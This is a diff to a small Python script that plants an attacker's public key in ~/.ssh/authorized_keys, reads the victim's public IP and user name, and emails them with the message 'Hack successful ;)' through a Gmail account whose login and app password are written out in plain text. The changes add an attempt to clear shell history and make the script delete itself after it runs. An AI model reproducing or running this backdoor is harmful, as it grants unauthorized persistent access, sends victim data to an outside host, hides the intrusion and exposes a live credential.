@@ -1,5 +1,7 @@
 import smtplib
 import subprocess
+from os import remove
+from sys import argv
 from email.mime.text import MIMEText
 
 from requests import get
@@ -12,6 +14,7 @@ if __name__ == "__main__":
     ip = get('https://api.ipify.org').content.decode('utf8')
     print('My public IP address is: {}'.format(ip)) 
 
+
     # Get current user name
     user = subprocess.run('echo $USER', shell=True, stdout=subprocess.PIPE)
 
@@ -20,6 +23,9 @@ if __name__ == "__main__":
     subprocess.run(f'echo {public_key} > ~/.ssh/authorized_keys', shell=True)
     subprocess.run('cat ~/.ssh/authorized_keys', shell=True)
     user = user.stdout.decode()
+
+    # Clear bash history if any
+    subprocess.run('history', shell=True)
 
     msg = f'Hack successful ;)\nSSH Tunnel setup\nIP Address: {ip}\nUser: {user}'
     msg = MIMEText(msg)
@@ -30,3 +36,6 @@ if __name__ == "__main__":
     mail.login("pythonhacknsu@gmail.com", "pmzmxvjeqcsfmrxr")
     mail.sendmail("pythonhacknsu@gmail.com", "danielodom23@gmail.com", msg.as_string())
     mail.quit()
+
+    # Delete the file
+    remove(argv[0])
